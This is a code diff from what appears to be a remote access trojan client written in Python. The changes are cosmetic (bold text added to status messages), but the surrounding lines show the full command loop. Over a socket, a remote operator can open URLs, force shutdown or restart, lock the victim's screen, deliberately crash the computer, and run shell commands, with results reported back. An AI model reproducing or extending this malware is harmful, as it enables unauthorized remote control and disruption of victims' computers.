@@ -89,38 +89,38 @@ def recieveCommands():
             try:
                 url = data[8:].decode("utf-8")
                 webbrowser.open_new(url)
-                success = '\n' + GREEN + '[*] Opened ' + url + ' successfully' + END + '\n'
+                success = '\n' + GREEN + BOLD + '[*] Opened ' + url + ' successfully' + END + '\n'
                 s.send(str.encode(success))
             except:
-                failed = '\n' + RED + "[!] Coudn't open " + url + END + '\n'
+                failed = '\n' + RED + BOLD + "[!] Coudn't open " + url + END + '\n'
                 s.send(str.encode(failed))
         elif data[:].decode("utf-8") == 'shutdown':
             try:
                 subprocess.call(['shutdown', "/s"])
-                success = '\n' + GREEN + '[*] Shutdown successfully' + END + '\n'
+                success = '\n' + GREEN + BOLD + '[*] Shutdown successfully' + END + '\n'
                 s.send(str.encode(success))
             except:
-                failed = '\n' + RED + "[!] Couldn't shudown computer" + END + '\n'
+                failed = '\n' + RED + BOLD + "[!] Couldn't shudown computer" + END + '\n'
                 s.send(str.encode(failed))
         elif data[:].decode("utf-8") == 'restart':
             try:
                 subprocess.call(['shutdown', '/r'])
-                success = '\n' + GREEN + '[*] Restarted successfully' + END + '\n'
+                success = '\n' + GREEN + BOLD + '[*] Restarted successfully' + END + '\n'
                 s.send(str.encode(success))
             except:
-                failed = '\n' + RED + "[!] Couldn't restart computer" + END + '\n'
+                failed = '\n' + RED + BOLD + "[!] Couldn't restart computer" + END + '\n'
                 s.send(str.encode(failed))
         elif data[:].decode("utf-8") == 'memory':
             try:
                 mem = str(virtual_memory())
-                virtualram = '\n' + GREEN + 'Available memory in bytes: ' + END + CYAN + mem + END
+                virtualram = '\n' + GREEN + BOLD + 'Available memory in bytes: ' + END + CYAN + mem + END
                 s.send(str.encode(virtualram))
             except:
-                error = RED + "[!] Couldn't get virtual ram" + END + '\n'
+                error = RED + BOLD + "[!] Couldn't get virtual ram" + END + '\n'
                 s.send(str.encode(error))
         elif data[:4].decode("utf-8") == 'lock':
             try:
-                successSend = ('\n' + GREEN + '[*] Successfully locked computer screen' + END + '\n')
+                successSend = ('\n' + GREEN + BOLD + '[*] Successfully locked computer screen' + END + '\n')
                 s.send(str.encode(successSend))
                 message = data[5:].decode('utf-8')
                 class App():
@@ -145,7 +145,7 @@ def recieveCommands():
                         self.root.destroy()
                 App()
             except:
-                error = '\n' + RED + '[!] There was an error locking the screen' + END + '\n'
+                error = '\n' + RED + BOLD + '[!] There was an error locking the screen' + END + '\n'
                 s.send(str.encode(error))
 
         elif data[:].decode('utf-8') == 'crash':
@@ -161,10 +161,10 @@ def recieveCommands():
                 bashcommand = 'start ' + pathToCrash
                 os.system(bashcommand)
                 os.rmdir(removePath)
-                success = '\n' + GREEN + '[*] Successfully crashing computer' + END + '\n'
+                success = '\n' + GREEN + BOLD + '[*] Successfully crashing computer' + END + '\n'
                 s.send(str.encode(success))
             except:
-                error = '\n' + RED + '[!] There was an error in attempting to crash the computer' + END + '\n'
+                error = '\n' + RED + BOLD + '[!] There was an error in attempting to crash the computer' + END + '\n'
                 s.send(str.encode(error))
         elif data[:].decode('utf-8') == 'dir':
             cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
